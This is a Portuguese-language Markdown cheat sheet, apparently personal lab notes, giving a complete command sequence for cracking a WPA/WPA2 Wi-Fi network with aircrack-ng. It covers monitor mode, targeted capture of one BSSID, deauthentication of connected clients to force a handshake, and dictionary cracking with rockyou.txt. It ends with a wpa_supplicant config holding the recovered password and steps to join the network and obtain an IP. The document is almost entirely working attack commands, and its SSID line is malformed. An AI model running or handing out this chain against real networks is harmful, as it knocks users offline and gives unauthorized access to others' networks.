# WPA

## Verificar interfaces de rede wi-fi
### Mostra quais interfaces de rede sem fio estão disponíveis e seu estado atual
```
iwconfig
```
## Matar processos indesejáveis
Finaliza processos que podem atrapalhar o modo monitor (como NetworkManager, wpa_supplicant).
```
sudo airmon-ng check kill
```
## Iniciar modo monitor na interface wlan0
### Coloca a interface wlan0 em modo monitor, criando geralmente wlan0mon.
Esse modo permite capturar pacotes sem estar associado a uma rede.
```
sudo airmon-ng start wlan0
```
## Verificar interfaces de rede wi-fi
### Mostra quais interfaces de rede sem fio estão disponíveis e seu estado atual
```
iwconfig
```
## Varrer redes Wi-Fi
### Lista todas as redes Wi‑Fi próximas, mostrando SSID, BSSID, canal, tipo de criptografia e clientes conectados.
```
sudo airodump-ng wlan0mon
```
## Captura de pacotes da rede alvo
### Coloca a interface em modo monitor (wlan0mon) e captura tráfego da rede com BSSID F0:9F:C2:71:22:12 no canal 6. Os pacotes são salvos em wifi-mobile.cap.
```
sudo airodump-ng wlan0mon --bssid F0:9F:C2:71:22:12 -c 6 -w wifi-mobile
```
## Forçar desconexão de clientes
### Envia 10 pacotes de deauth para desconectar clientes da rede. Isso força os dispositivos a se reconectarem, gerando o handshake WPA/WPA2 que será capturado.
```
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
```
## Quebrar a senha com dicionário
### Usa o arquivo de captura (wifi-mobile-01.cap) e tenta quebrar a senha com o dicionário rockyou.txt. Se a senha estiver no wordlist, será revelada.
```
sudo aircrack-ng wifi-mobile-01.cap -w /usr/share/wordlists/rockyou.txt
```
## Arquivo de configuração da rede
### Define como o wpa_supplicant deve se conectar à rede wifi-mobile. Inclui SSID, BSSID e a senha descoberta (starwars1), além de parâmetros avançados para compatibilidade.
```
network={
        ssid=wifi-"mobile"
        bssid=F0:9F:C2:71:22:12
        psk="starwars1"

        # ADVANCED SETTINGS FOR RELIABILITY:
        scan_ssid=1        # Works if the SSID is hidden
        priority=100       # Forces the OS to pick THIS network over any others
        key_mgmt=WPA-PSK   # Standard for WPA2-Personal
        proto=RSN WPA      # RSN is WPA2. Including both ensures compatibility.
        pairwise=CCMP TKIP # CCMP is WPA2 standard; TKIP is for older WPA.
}
```
## Conectar à rede
### Usa a interface wlan1 e o arquivo mobile.conf para autenticar na rede WPA/WPA2.
```
sudo wpa_supplicant -i wlan1 -c mobile.conf
```
## Obter endereço IP
### Solicita um IP via DHCP para a interface wlan1. Após isso, a máquina já tem acesso à rede.
```
sudo dhclient wlan1 -v
```
